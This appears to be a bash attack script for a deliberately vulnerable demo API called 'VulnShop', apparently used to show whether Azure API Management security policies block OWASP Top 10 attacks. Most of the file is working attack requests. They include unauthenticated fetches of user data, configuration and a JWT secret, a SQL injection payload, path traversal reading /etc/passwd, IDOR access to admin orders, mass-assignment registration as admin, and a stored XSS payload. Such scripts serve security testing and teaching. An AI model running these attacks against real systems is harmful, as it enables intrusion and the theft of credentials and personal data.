#!/bin/bash

# Comprehensive, non-destructive attack script for VulnShop API - FIXED VERSION
# This script tests for sensitive data exposure, lack of authentication,
# and other OWASP Top 10 vulnerabilities.

# --- Configuration ---
# Default to localhost, but allow overriding with an environment variable
API_BASE_URL=${API_BASE_URL:-"http://localhost:3001"}
TIMESTAMP=$(date +%Y%m%d%H%M%S)
RANDOM_ID=$((RANDOM % 9999))
echo "Targeting API at: $API_BASE_URL"
echo "Test Run ID: $TIMESTAMP-$RANDOM_ID"
echo "---"

# --- Helper Functions ---
function print_header() {
    echo -e "\n\n=================================================="
    echo -e "  $1"
    echo -e "==================================================\n"
}

function run_test() {
    local test_name="$1"
    local command="$2"
    
    echo -e "--- Starting Test: $test_name ---"
    
    # Execute command and capture both stdout and stderr
    local output
    local exit_code
    output=$(eval $command 2>&1)
    exit_code=$?
    
    # Check for specific error patterns
    if echo "$output" | grep -q "403 Forbidden"; then
        echo -e "\033[31mBLOCKED BY APIM: 403 Forbidden - Security policy prevented this attack\033[0m"
    elif [ $exit_code -eq 0 ]; then
        if [ -n "$output" ]; then
            echo "$output"
        else
            echo -e "\033[90mNo data returned\033[0m"
        fi
    else
        echo -e "\033[31mError running test: $output\033[0m"
    fi
    
    echo -e "\n--- Test Complete: $test_name ---\n"
    sleep 1
}

# --- Attack Scenarios ---

# 1. Lack of Authentication & Information Disclosure
print_header "Testing Public Endpoints (No Authentication Required)"

run_test "Discover API Endpoints" \
    "curl -s -X GET '$API_BASE_URL/api/discovery' | jq"

run_test "Fetch All Users (Sensitive Data Exposure)" \
    "curl -s -X GET '$API_BASE_URL/api/public/users?limit=5' | jq '.users[0]'"

run_test "Fetch System Information (Sensitive Data Exposure)" \
    "curl -s -X GET '$API_BASE_URL/api/public/system-info' | jq '.system.env.JWT_SECRET'"

run_test "Fetch Database Schema (Sensitive Data Exposure)" \
    "curl -s -X GET '$API_BASE_URL/api/public/db-schema' | jq"

run_test "Fetch Recent Orders (Sensitive Data Exposure)" \
    "curl -s -X GET '$API_BASE_URL/api/public/recent-orders' | jq"

run_test "Fetch App Configuration (Exposing JWT Secret)" \
    "curl -s -X GET '$API_BASE_URL/api/public/config' | jq"

run_test "Fetch Debug Information" \
    "curl -s -X GET '$API_BASE_URL/api/public/debug' | jq '.routes[0]'"

# 2. Injection Attacks
print_header "Testing Injection Vulnerabilities"

run_test "SQL Injection - User Search (Bypass Auth)" \
    "curl -s -G '$API_BASE_URL/api/public/user-search' --data-urlencode \"username=' OR '1'='1' --\" | jq"

run_test "SQL Injection - Product Search (Error-Based)" \
    "curl -s -G '$API_BASE_URL/api/products/search' --data-urlencode \"q='\" | jq"

# 3. Path Traversal
print_header "Testing Path Traversal"

# Detect platform and test appropriate path
if [[ "$OSTYPE" == "linux-gnu"* ]] || [[ "$OSTYPE" == "darwin"* ]]; then
    run_test "Attempt to Read /etc/passwd" \
        "curl -s -X GET '$API_BASE_URL/api/public/files?path=/etc/passwd'"
else
    run_test "Attempt to Read hosts file (Windows)" \
        "curl -s -X GET '$API_BASE_URL/api/public/files?path=C:\\Windows\\System32\\drivers\\etc\\hosts'"
fi

run_test "Attempt to Read package.json" \
    "curl -s -X GET '$API_BASE_URL/api/public/files?path=./package.json' | jq '.content' | head -n 10"

# 4. Broken Authentication & Access Control
print_header "Testing Authentication and Access Control"

# Use unique timestamp-based credentials
UNIQUE_USER="attacker_${TIMESTAMP}"
UNIQUE_EMAIL="attacker_${TIMESTAMP}@test.com"

run_test "Register a New User" \
    "curl -s -X POST -H 'Content-Type: application/json' -d '{\"username\":\"$UNIQUE_USER\",\"email\":\"$UNIQUE_EMAIL\",\"password\":\"password123\"}' '$API_BASE_URL/api/register' | jq"

# Try to login and get token
TOKEN=$(curl -s -X POST -H "Content-Type: application/json" -d "{\"username\":\"$UNIQUE_USER\",\"password\":\"password123\"}" "$API_BASE_URL/api/login" | jq -r '.token')

if [ -z "$TOKEN" ] || [ "$TOKEN" = "null" ]; then
    echo -e "\033[31mFailed to login. Some tests will be skipped.\033[0m"
else
    echo -e "\033[32mSuccessfully logged in as '$UNIQUE_USER'\033[0m"
    
    # Create test data for IDOR testing
    print_header "Creating Test Data for IDOR Testing"
    
    # Add item to cart
    run_test "Add Item to Cart" \
        "curl -s -X POST -H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' -d '{\"productId\":1,\"quantity\":1}' '$API_BASE_URL/api/cart' | jq"
    
    # Create order
    ORDER_RESPONSE=$(curl -s -X POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"items":[{"productId":1,"quantity":1}]}' "$API_BASE_URL/api/orders")
    ORDER_ID=$(echo "$ORDER_RESPONSE" | jq -r '.id')
    
    if [ -n "$ORDER_ID" ] && [ "$ORDER_ID" != "null" ]; then
        echo -e "\033[32mCreated order with ID: $ORDER_ID\033[0m"
    else
        echo -e "\033[31mFailed to create order\033[0m"
    fi
    
    print_header "Testing IDOR and Access Control Vulnerabilities"
    
    # Test IDOR
    run_test "Attempt IDOR to Access Admin's Order (Order ID 1)" \
        "curl -s -X GET -H \"Authorization: Bearer $TOKEN\" '$API_BASE_URL/api/orders/1' | jq"
    
    if [ -n "$ORDER_ID" ] && [ "$ORDER_ID" != "null" ]; then
        run_test "Access Own Order (Baseline Test)" \
            "curl -s -X GET -H \"Authorization: Bearer $TOKEN\" '$API_BASE_URL/api/orders/$ORDER_ID' | jq"
    fi
    
    run_test "Attempt to Export Admin's Data (User ID 1)" \
        "curl -s -X GET -H \"Authorization: Bearer $TOKEN\" '$API_BASE_URL/api/users/1/export' | jq '.user'"
fi

# 5. Mass Assignment
print_header "Testing Mass Assignment Vulnerability"

ADMIN_USER="eviladmin_${TIMESTAMP}"
ADMIN_EMAIL="evil_${TIMESTAMP}@test.com"

run_test "Register New User with Admin Role" \
    "curl -s -X POST -H 'Content-Type: application/json' -d '{\"username\":\"$ADMIN_USER\",\"email\":\"$ADMIN_EMAIL\",\"password\":\"password123\",\"role\":\"admin\"}' '$API_BASE_URL/api/register' | jq"

ADMIN_TOKEN=$(curl -s -X POST -H "Content-Type: application/json" -d "{\"username\":\"$ADMIN_USER\",\"password\":\"password123\"}" "$API_BASE_URL/api/login" | jq -r '.token')

if [ -z "$ADMIN_TOKEN" ] || [ "$ADMIN_TOKEN" = "null" ]; then
    echo -e "\033[31mFailed to login as admin user. Mass assignment may have been blocked.\033[0m"
else
    echo -e "\033[32mSuccessfully logged in as '$ADMIN_USER' - mass assignment likely successful!\033[0m"
    run_test "Verify Admin Access by Fetching All Users" \
        "curl -s -X GET -H \"Authorization: Bearer $ADMIN_TOKEN\" '$API_BASE_URL/api/admin/users' | jq '.users[0]'"
fi

# 6. Cross-Site Scripting (XSS)
if [ -n "$TOKEN" ] && [ "$TOKEN" != "null" ]; then
    print_header "Testing XSS in Product Reviews"
    
    run_test "Submit Review with XSS Payload" \
        "curl -s -X POST -H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' -d '{\"rating\":5,\"comment\":\"<script>alert(\\\"XSS-$TIMESTAMP\\\")</script>\"}' '$API_BASE_URL/api/products/1/reviews' | jq"
    
    run_test "Verify XSS Payload is Stored" \
        "curl -s -X GET '$API_BASE_URL/api/products/1' | jq '.reviews[] | select(.comment | contains(\"<script>\"))'"
fi

# Summary Report
print_header "Test Summary"
echo "Test Run ID: $TIMESTAMP-$RANDOM_ID"
echo -e "\n\033[33mNote: Tests marked as 'BLOCKED BY APIM' indicate the Azure API Management"
echo "security policies are working correctly to prevent these attacks."
echo -e "Other errors indicate application-level vulnerabilities or issues.\033[0m"

echo -e "\n\n=================================================="
echo -e "\033[32m  All non-destructive attacks completed.\033[0m"
echo -e "==================================================\n" 